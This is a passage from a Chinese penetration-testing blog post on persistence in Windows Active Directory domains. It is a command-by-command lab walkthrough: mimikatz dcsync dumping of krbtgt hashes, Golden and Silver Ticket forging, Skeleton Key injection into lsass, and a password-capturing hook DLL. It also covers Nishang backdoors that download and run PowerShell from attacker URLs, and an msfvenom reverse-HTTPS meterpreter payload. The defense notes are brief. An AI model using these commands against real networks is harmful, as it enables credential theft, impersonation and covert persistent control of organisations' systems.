<p>通过<code>mimikatz的dcsync</code>功能远程转储活动目录中<code>ntds.dit</code>。指定<code>/user</code> 参数 只导出<code>krbtgt</code>账号的信息：<code>ff73ba115f7d6145f4c2e41f97f9a320</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/23.png" alt></p>
<p><strong>2、获取基本信息</strong></p>
<p>（1）获取域SID</p>
<p>查询SID,这种方法，可以以普通用户权限获取域内所有用户的SID。<code>hacke.testlab</code>域的<code>SID</code>为<code>S-1-5-21-3125703835-992822856-3564750058</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/24.png" alt></p>
<p>（2）获取当前用户的<code>SID</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/25.png" alt></p>
<p>（3）查询域管理员账号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/26.png" alt></p>
<p>（3）查询域名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/27.png" alt></p>
<p><strong>3、实验操作</strong></p>
<p>在获取目标主机权限后，查看当前用户及其所属的组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user testuser /domain</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/28.png" alt></p>
<p>输入<code>dir \\dc\c$</code>在注入票据前将返回提示信息<code>Access is denied</code>(表示权限不足)</p>
<p><img src="/2020/10/26/权限维持/35.png" alt></p>
<p>（1）清空票据</p>
<p>运行mimikatz，清除当前会话中的票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>

<p>（2）生成票据</p>
<p>使用mimikatz生成包含<code>krbtgt</code>身份的票据,命令执行后会提示保存成功，这时会在本地生成一个名为<code>Administrator:kiribi</code>的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:hacke.testlab /sid:S-1-5-21-3125703835-992822856-3564750058 /krbtgt:ff73ba115f7d6145f4c2e41f97f9a320 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/29.png" alt></p>
<p>（3）传递票据并注入内存</p>
<p>将<code>Aadministrator:kiribi</code>票据注入内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/30.png" alt></p>
<p>（4）检查当前会话中的票据</p>
<p>刚刚注入的票据就会出现在当前的会话中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/31.png" alt></p>
<p><strong>4、权限验证</strong></p>
<p>输入<code>dir \\dc\c$</code>。很明显，在将票据注入内存之前，系统提示权限不足，将票据注入内存之后，列出了域控制器C盘的目录，表示身份伪造成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br><span class="line">cscript wmiexec.vbs /shell dc</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/32.png" alt></p>
<p><img src="/2020/10/26/权限维持/33.png" alt></p>
<p>使用<code>krbtgt的AES-256</code>值生成票据并将其注入内存，也可伪造用户。之前导出的<code>krbtgt的AES-256</code>值为<code>40e24d35600583634503c3aa076b39ecc3031a97467103539221472b3897e0c2</code>如下命令，生成一张票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:hacke.testlab /sid:S-1-5-21-3125703835-992822856-3564750058 /aes256:40e24d35600583634503c3aa076b39ecc3031a97467103539221472b3897e0c2 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/34.png" alt></p>
<p>其他操作同上</p>
<p><strong>5、Golden Ticket攻击的防御</strong></p>
<p>管理员通常会修改域管理员的密码，但有时会忘记将krbtgt密码一并重置。因此，如果要防御Golden Ticket，需要将krbtgt密码重置两次</p>
<p>使用Golden Ticket伪造的用户可以是任意用户（即使这个用户不存在）。因为TGT的加密是由krbtgt完成的，因此，只要TGT被krbtgt账户和米么正确地加密，那么任意KDC使用krbtgt将TGT解密后，TGT中的所有信息都是可信的。在如下两种情况下才能修改krbtgt密码</p>
<ul>
<li>域功能级别从windows 2000或windows server 2003提升至windows server2008或windows server 2012。在提升域功能的过程中，krbtgt的密码会被自动修改</li>
<li>用户自行进行安全检查和相关服务加固时会修改krbtgt的密码</li>
</ul>
<h5 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h5><p><code>Silver Ticket(白银票据)</code>不同于<code>Golden Ticket</code>。<code>Silver Ticket</code>的利用过程是伪造<code>TGS</code>，通过已知的授权服务密码生成一张可以访问该服务的<code>TGT</code>。因为在票据生成过程中不需要使用<code>KDC</code>,所以可以绕过域控制器，很少留下日志。而<code>Golden Ticket</code>在利用过程中需要由<code>KDC</code>颁发<code>TGT</code>,并且在生成伪造的TGT的20分钟内，TGS不会对该TGT的真伪进行校验</p>
<p><code>Silver Ticket</code>依赖于服务账号的密码散列值，不用域Golden Ticket利用需要使用krbtgt账号的密码散列值，因此更加隐蔽</p>
<p><code>Golden Ticket</code>使用<code>krbtgt</code>账号的密码散列值，利用伪造高权限的TGT向KDC要求颁发拥有任意服务访问权限的票据，从而获取域控制器权限。而<code>Silver Ticket</code>会通过相应的服务账号来伪造<code>TGS</code>，如LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限。</p>
<p><code>Golden Ticket</code>是由<code>krbtgt</code>账号加密的，而<code>Silver Ticket</code>是由特定的服务账号加密的</p>
<p>在使用<code>Silver Ticket</code>时需要掌握以下信息</p>
<ul>
<li>域名</li>
<li>域SID</li>
<li>目标服务器的FQDN</li>
<li>可利用的服务</li>
<li>服务账号的NTLM Hash</li>
<li>需要伪造的用户名</li>
</ul>
<p><strong>1、实验：使用Silver Ticket伪造CIFS服务权限</strong></p>
<p><code>CIFS</code>服务通常用于windows主机之间的文件共享</p>
<p>首先使用当前域用户权限，查询对域控制器的共享目录的访问权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/35.png" alt></p>
<p>在域控制器上运行mimikatz，获取服务账号的NTLM Hash <code>09bc0266e773764dc3606744ddbe133d</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用log参数以便复制散列值</span><br><span class="line">mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/36.png" alt></p>
<p>清空本地票据缓存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge #清理本地票据缓存</span><br><span class="line">kerberos::list #查看本地保存的票据</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/38.png" alt></p>
<p>在域成员机器上，既不能访问域控制器共享目录的机器中输入命令生成伪造的<code>Silver Ticket</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:DCSRV.Motoo.nc /sid:S-1-5-21-284927032-1122706408-2778656994 /target:MoToo-DCSRV.Motoo.nc /service:cifs /rc4:eabd9a2e3a1733bcc44120572b571ae8 /user:WebAdm /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/37.png" alt></p>
<p>验证去啊先，发现可以访问域控制器的共享目录了</p>
<p><strong>2、实验：使用Silver Ticket伪造LDAP服务权限</strong></p>
<p>使用dcsync从域控制器中获取指定用户的账号和密码散列值</p>
<p>测试以当前权限是否可以使用dcsync与域控制器进行同步,发现失败，当前权限不能进行dcsync操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/40.png" alt></p>
<p>在域控制器中使用mimikatz获取服务账号NTLM Hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用log参数以便复制散列值</span><br><span class="line">mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>

<p>清空当前系统中的票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge #清理本地票据缓存</span><br><span class="line">kerberos::list #查看本地保存的票据</span><br></pre></td></tr></table></figure>

<p>生成伪造的Silver Ticket ,在之前不能使用dcsync从域控制器获取krbtgt密码散列值的机器中输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.testlab /sid:S-1-5-21-3125703835-992822856-3564750058 /target:dc.hacke.testlab /service:LDAP /rc4:09bc0266e773764dc3606744ddbe133d /user:testuser /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/39.png" alt></p>
<p>使用dcsync在域控制器中茶轩krbtgt的密码散列值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hacke.testlab /domain:hacke.testlab /user:krbtgt</span><br></pre></td></tr></table></figure>

<p>Silver Ticket还可用于伪造其他服务，如创建和修改计划任务、使用WMI对远程主机执行命令、使用PowerShell对远程主机进行管理</p>
<p>*<em>3.Silver Ticket攻击的防御 *</em></p>
<ul>
<li>装杀软，更新补丁</li>
<li>使用组策略在域中进行相应的配置，限制mimikatz在网络中的使用</li>
<li>计算机的账号和密码默认每30天更改一次。检查该设置是否生效</li>
</ul>
<h5 id="Skeleton-Key-万能密码"><a href="#Skeleton-Key-万能密码" class="headerlink" title="Skeleton Key(万能密码)"></a>Skeleton Key(万能密码)</h5><p>使用<code>Skeleton Key(万能密码)</code>，可以对域内权限进行持久化操作</p>
<p>将<code>Skeleton Key</code>注入到域控制器的<code>lass.exe</code>进程</p>
<p>实验环境</p>
<p>域控制器</p>
<ul>
<li>主机名：DC</li>
<li>IP地址：192.168.1.1</li>
<li>用户名：administrator</li>
<li>密码：Admin!@#$4321</li>
</ul>
<p>域成员服务器</p>
<ul>
<li>主机名：2008</li>
<li>IP地址：192.168.1.2</li>
<li>用户名：testuser</li>
<li>密码：Admin!@#$1234</li>
</ul>
<p><strong>1.实验：在mimikatz中使用Skeleton Key</strong></p>
<p>尝试以当前登录用户身份列出域控制器<code>C盘</code>共享目录中的文件。因为此时使用的是一个普通域用户身份，所以系统提示权限不足</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.1\c$</span><br><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/41.png" alt></p>
<p>使用域管理员账号和密码进行连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ &quot;Admin!@#$4321&quot; /user:hacke.testlab\administrator</span><br><span class="line">dir \\192.168.1.1\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/42.png" alt></p>
<p>在域控制器中以管理员权限打开<code>mimikatz</code>，分别输入如下命令，将<code>Skeleton Key</code>注入域控制器的<code>lsass.exe</code>进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/43.png" alt></p>
<p>提示<code>Skeleton Key</code>已经注入成功。这时，会在域内的所有账号中添加一个<code>Skeleton Key</code>,其密码默认为<code>mimikatz</code>。接下来，就可以以域内任意用户的身份，配合该<code>Skeleton Key</code>，进行域内身份授权验证</p>
<p>在不使用域管理员原始密码的情况下，使用注入的<code>Skeleton Key</code>,同样可以成功连接系统。</p>
<p>先将之前建立的<code>ipc$</code>删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br><span class="line">net use \\192.168.1.1\ipc$ /del /y</span><br></pre></td></tr></table></figure>

<p>输入如下命令，使用域管理员账号和<code>Skeleton Key</code>与域控制器建立<code>ipc$</code>。成功建立连接，并列出了域控制器<code>C盘</code>的共享目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:hacke.testlab\administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/44.png" alt></p>
<p><strong>2.实验：在Empire中使用Skeleton Key</strong></p>
<p>在获取一个<code>agent</code>的时,将<code>skeleton_key</code>注入后，Empire会提示可以使用密码<code>mimikatz</code>进入系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interact A93VXTMU //进入agent</span><br><span class="line">usemodule persistemce/misc/skeleton_key</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p><strong>3.Skeleton Key攻击防御措施</strong></p>
<p>14年，微软增加了LSA保护策略，以防止lsass.exe进程被恶意注入，从而防止mimikatz在非允许的情况下提升到Debug权限。通用的Skeleton Key防御措施如下</p>
<ul>
<li>域管理员用户要设置强口令，确保恶意代码不会在域控制器中执行</li>
<li>在所有域用户中启用双因子认证，例如智能卡认证</li>
<li>启动应用程序白名单（如AppLocker）以限制mimikatz在域控制器中的运行</li>
</ul>
<p>日常网络维护中，注意以下方面，也可有效防范Skeleton Key</p>
<ul>
<li>向域控制器注入Skeleton Key的方法，只能在64位操作系统中使用，包括Windows server 2012 R2、Windows server 2012、Windows server 2008、Windows server 2008 R2 Windows server 2003 R2 、Windows Server 2003</li>
<li>只有具有域管理员权限的用户可以将Skeleton Key注入域控制器的lsass.exe进程</li>
<li>Skeleton Key被注入后，用户使用现有的密码仍然可以登录系统</li>
<li>因为Skeleton Key是被注入lass.exe进程，所以它只存在于内存中。如果域控制器重启，注入的Skeleton Key将会失效。</li>
</ul>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p>Hook PasswordChangeNotify的作用是当用户修改密码后在系统中进行同步。可以利用该功能获取用户修改密码时输入的密码明文</p>
<p>在修改密码时，用户输入新密码后，LSA会嗲用PasswordFileter来检查该密码是否符合复杂性要求。如果符合复杂性要求，LSA会调用PasswordChangeNotify，在系统中同步密码</p>
<p><strong>1、生成Hook dll</strong></p>
<p>参考链接:<a href="http://www.vuln.cn/6812" target="_blank" rel="noopener">域渗透——Hook PasswordChangeNotify – 三好学生</a></p>
<p>poc下载地址：<a href="https://github.com/clymb3r/Misc-Windows-Hacking" target="_blank" rel="noopener">https://github.com/clymb3r/Misc-Windows-Hacking</a></p>
<p>使用VS2019开发环境，MFC设置为在静态库中使用MFC编译工程，生成<code>HookPasswordChange.dll</code>,这里要选静态库中使用<code>MFC</code>，不然生成的dll会报错</p>
<p><img src="/2020/10/26/权限维持/54.png" alt></p>
<p>下载Powershell的dll注入脚本：</p>
<p><a href="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p>
<p>在目标系统中启动管理员权限的Powershell使用 使用Invoke-ReflectivePEInjection.ps1注入HookPasswordChange.dll内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/55.png" alt></p>
<p>在Server 2012 R2 x64下，手动修改域控密码后<br>在<code>C:\Windows\Temp</code>下可以找到<code>passwords.txt</code>，其中记录了新修改的密码。一种直接命令修改，另一种可在<code>Active Directory 用户和计算机</code>对用户进行重置密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator Admin!@#123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/56.png" alt></p>
<h4 id="Nishang下的脚本后门"><a href="#Nishang下的脚本后门" class="headerlink" title="Nishang下的脚本后门"></a>Nishang下的脚本后门</h4><h5 id="HTTP-Backdoor脚本"><a href="#HTTP-Backdoor脚本" class="headerlink" title="HTTP-Backdoor脚本"></a>HTTP-Backdoor脚本</h5><p>HTTP-Backdoor脚本可以在目标主机上下载和执行powershell脚本，接收来自第三方网站的指令，在内存中执行powershell脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TTP-Backdoor -CheckURL http://pentest.com/test.php?id=1 -PayloadURL http://pentest.com/test.php?id=2 -MagicString start123 -StopString stopthis</span><br></pre></td></tr></table></figure>

<ul>
<li>-CheckURL:给出一个URL地址。如果该地址存在，MagicString中值就会执行Payload下载并运行攻击者的脚本</li>
<li>PayloadURL:给出需要下载的powershell脚本的地址</li>
<li>StopString:判断是否存在CheckURL返回的字符串，如果存在则停止执行</li>
</ul>
<h5 id="Add-ScrnSaveBackdoor脚本"><a href="#Add-ScrnSaveBackdoor脚本" class="headerlink" title="Add-ScrnSaveBackdoor脚本"></a>Add-ScrnSaveBackdoor脚本</h5><p>Add-ScrnSaveBackdoor脚本可以利用Windows的屏幕保护功能程序安安装一个隐藏的后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Add-ScrnSaveBackdoor -Payload &quot;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process&quot; //执行payload</span><br><span class="line">Add-ScrnSaveBackdoor -PayloadURL http://192.168.1.1/Powerpreter.psm1 -Arguments HTTP-Backdoor http://pentest.com/test.php?id=1 -PayloadURL http://pentest.com/test.php?id=2 start123 stopthis //在powershell中执行一个HTTP-Backdoor脚本</span><br><span class="line"></span><br><span class="line">Add-ScrnSaveBackdoor -PayloadURL http://192.168.1.1/code.exec.ps1</span><br></pre></td></tr></table></figure>

<ul>
<li>PayloadURL:指定需要下载的脚本地址</li>
<li>-Arguments:执行需要执行的函数及相关参数</li>
</ul>
<p>用msfvenom生成一个Powershell然后执行如下命令，返回一个meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x -f powershell</span><br></pre></td></tr></table></figure>

<h5 id="Execute-OnTime"><a href="#Execute-OnTime" class="headerlink" title="Execute-OnTime"></a>Execute-OnTime</h5><p>Execute-Ontime脚本用于在目标主机上指定powershell脚本的执行时间，与HTTP-Backdoor脚本使用方法类似，只是增加了定时功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Execute-Ontime PayloadURL http://pentest.com/test.php?id=1 -Arguments Get-Information -Time hh:mm -CheckURL http://pentest.com/test.php?id=2 -Stopstring stoppayload</span><br></pre></td></tr></table></figure>

<ul>
<li>PayloadURL:指定下载的脚本地址</li>
<li>-Arguments：指定要执行的函数名</li>
<li>-Time:设置脚本执行的时间，如<code>-Time 23:21</code></li>
<li>-CheeckURL:检测一个指定的URL里是否存在StopString给出的字符串，如果存在就停止执行</li>
</ul>
<h5 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h5><p>Invoke-ADSBackdoor脚本能够在NTFS数据流中留下一个永久性的后门。不易被发现</p>
<p>Invoke-ADSBackdoor脚本用于向ADS注入代码并以普通用户权限运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ADSBackdoor -PayloadURL http://test/test.ps1</span><br></pre></td></tr></table></figure>

<p>执行后，手工无法找到其问题，只有执行<code>dir /a /r</code>命令才能看到写入的文件</p>
<p>参考资料</p>
<p>内网安全攻防</p>
<p>近源渗透测试</p>
</div><!--文章标签--><div class="tags"><a href="/tags/内网渗透/">内网渗透</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">24</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 18px;">远程代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 13.5px;">Cobalt Strike</a> <a href="/tags/cobaltstrike/" style="font-size: 13.5px;">cobaltstrike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 16.5px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/burpsuite/" style="font-size: 12px;">burpsuite</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/venom/" style="font-size: 12px;">venom</a> <a href="/tags/免杀/" style="font-size: 15px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/端口转发/" style="font-size: 12px;">端口转发</a> <a href="/tags/Bypass/" style="font-size: 12px;">Bypass</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/sqlmap/" style="font-size: 12px;">sqlmap</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/内网渗透/" style="font-size: 13.5px;">内网渗透</a> <a href="/tags/域信息收集/" style="font-size: 13.5px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/权限维持/">权限维持</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/Cobalt-Strike添加UI/">Cobalt-Strike添加UI</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/24/sqlmapapi学习使用/">sqlmapapi学习使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/18/深信服EDR-RCE/">深信服EDR-RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/09/BypassUAC方法论学习/">BypassUAC方法论学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/06/CVE-2020-5902-BIG-IP-RCE-复现/">CVE-2020-5902(BIG-IP RCE)复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/域控制器/">域控制器</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/30/域内横向移动二/">域内横向移动二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/27/域内横向移动一/">域内横向移动一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/CobaltStrike二次开发环境准备/">CobaltStrike二次开发环境准备</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://www.vkxss.top/" title="VK" target="_blank">VK</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
  if($(".highlight").length != 0){
    var pc_width = $(".post-content").width();
    $(".highlight .code").find("pre").width((pc_width-70)+"px");
  }
}
window.onresize = function(){
  auto_code_fit();
}
auto_code_fit();</script></div></body>